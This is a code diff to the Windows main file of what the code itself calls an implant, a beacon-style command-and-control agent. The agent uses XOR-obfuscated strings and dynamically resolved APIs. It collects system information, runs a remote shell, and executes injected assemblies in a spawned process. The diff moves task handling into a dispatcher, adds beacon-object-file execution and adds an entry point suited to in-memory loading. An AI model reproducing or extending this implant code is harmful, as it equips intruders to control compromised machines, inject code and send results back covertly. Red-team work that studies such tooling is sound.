@@ -1,9 +1,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <bcrypt.h>
-#include <string.h>
 #include <stdint.h>
-#include <stdio.h>
 #include "config.h"
 #include "protocol.h"
 #include "crypto.h"
@@ -14,9 +12,10 @@
 #include "obf_strings.h"
 #include "dynapi.h"
 #include "transfer.h"
-#include "assembly.h"
 #include "session.h"
 #include "shell.h"
+#include "task_dispatch.h"
+#include "mini_std.h"
 
 /* ---- Sysinfo ---- */
 
@@ -74,6 +73,20 @@ static void collect_sysinfo(implant_metadata_t *meta) {
     meta->arch      = get_arch();
     meta->platform  = 2;  /* Windows */
     meta->integrity = get_integrity();
+}
+
+typedef struct {
+    uint32_t beacon_id;
+    const uint8_t *session_key;
+} http_task_result_ctx_t;
+
+static int http_task_result_cb(void *ctx, uint32_t label, uint8_t type,
+                               uint8_t code, uint16_t flags,
+                               const char *output, uint32_t output_len) {
+    http_task_result_ctx_t *rctx = (http_task_result_ctx_t *)ctx;
+    if (!rctx || !rctx->session_key) return -1;
+    return send_result_typed(rctx->beacon_id, label, type, code, flags,
+                             output, output_len, rctx->session_key);
 }
 
 /* ---- Session thread (non-blocking) ---- */
@@ -273,39 +286,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         else if (hdr.type == TASK_SHELL_STOP) {
                             shell_stop();
                         }
-                        else if (hdr.type == TASK_EXEC_ASSEMBLY && task_data && task_data_len >= 8) {
-                            uint32_t sc_len = (uint32_t)task_data[0]
-                                | ((uint32_t)task_data[1] << 8)
-                                | ((uint32_t)task_data[2] << 16)
-                                | ((uint32_t)task_data[3] << 24);
-                            const uint8_t *sc = task_data + 4;
-                            if (4 + sc_len + 4 <= task_data_len) {
-                                uint32_t sp_off = 4 + sc_len;
-                                uint32_t sp_len = (uint32_t)task_data[sp_off]
-                                    | ((uint32_t)task_data[sp_off+1] << 8)
-                                    | ((uint32_t)task_data[sp_off+2] << 16)
-                                    | ((uint32_t)task_data[sp_off+3] << 24);
-                                char spawnto_a[MAX_PATH] = {0};
-                                if (sp_len > 0 && sp_len < MAX_PATH && sp_off + 4 + sp_len <= task_data_len) {
-                                    memcpy(spawnto_a, task_data + sp_off + 4, sp_len);
-                                } else {
-                                    char _def[ENC_EXEC_ASM_SPAWNTO_LEN + 1];
-                                    xor_dec(_def, ENC_EXEC_ASM_SPAWNTO, ENC_EXEC_ASM_SPAWNTO_LEN);
-                                    _snprintf(spawnto_a, sizeof(spawnto_a) - 1, "%s", _def);
-                                }
-                                wchar_t spawnto_w[MAX_PATH] = {0};
-                                fnMultiByteToWideChar(65001 /*CP_UTF8*/, 0, spawnto_a, -1, spawnto_w, MAX_PATH);
-
-                                char output[EXEC_ASM_MAX_OUTPUT] = {0};
-                                exec_assembly(sc, sc_len, spawnto_w, output, sizeof(output));
-                                send_result(meta.id, hdr.label, FLAG_NONE,
-                                            output, meta.session_key);
-                            } else {
-                                char _me[ENC_EXEC_ASM_ERR_INJECT_LEN + 1];
-                                xor_dec(_me, ENC_EXEC_ASM_ERR_INJECT, ENC_EXEC_ASM_ERR_INJECT_LEN);
-                                send_result(meta.id, hdr.label, FLAG_ERROR,
-                                            _me, meta.session_key);
-                            }
+                        else if (hdr.type == TASK_EXEC_ASSEMBLY) {
+                            http_task_result_ctx_t rctx = { meta.id, meta.session_key };
+                            beacon_task_exec_assembly(task_data, task_data_len,
+                                                      hdr.label,
+                                                      http_task_result_cb, &rctx);
+                        }
+                        else if (hdr.type == TASK_BOF) {
+                            http_task_result_ctx_t rctx = { meta.id, meta.session_key };
+                            beacon_task_bof(task_data, task_data_len,
+                                            hdr.label,
+                                            http_task_result_cb, &rctx);
                         }
                         else if (hdr.type == TASK_EXIT) {
                             fnExitProcess(0);
@@ -331,4 +322,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         }
         fnSleep(actual_sleep);
     }
+}
+
+void WINAPI beacon_entry(void) {
+    int rc = WinMain(NULL, NULL, NULL, 0);
+    if (fnExitProcess) fnExitProcess((UINT)rc);
+    for (;;) { }
 }
